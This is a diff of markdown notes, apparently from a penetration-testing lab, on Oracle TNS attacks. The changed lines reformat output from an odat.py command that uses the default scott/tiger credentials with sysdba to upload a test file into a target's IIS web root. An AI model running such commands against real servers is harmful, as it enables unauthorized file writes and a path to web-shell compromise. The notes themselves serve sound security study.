@@ -190,8 +190,9 @@ Listener process uses the listener.ora file to determine the services it should 
 
 	- ```echo "Oracle File Upload Test" > testing.txt```
 	- ```./odat.py utlfile -s <target> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt```
-		- ```[1] (10.129.204.235:1521): Put the ./testing.txt local file in the ***C:\inetpub\wwwroot*** folder like testing.txt on the 10.129.204.235 server 
-		 [+] The ./testing.txt file was created on the ***C:\inetpub\wwwroot*** directory on the 10.129.204.235 server like the testing.txt file```
+		- ```[1] (10.129.204.235:1521): Put the ./testing.txt local file in the ***C:\inetpub\wwwroot*** folder like testing.txt on the 10.129.204.235 server ```
+    
+		 ```[+] The ./testing.txt file was created on the ***C:\inetpub\wwwroot*** directory on the 10.129.204.235 server like the testing.txt file```
 
 
 
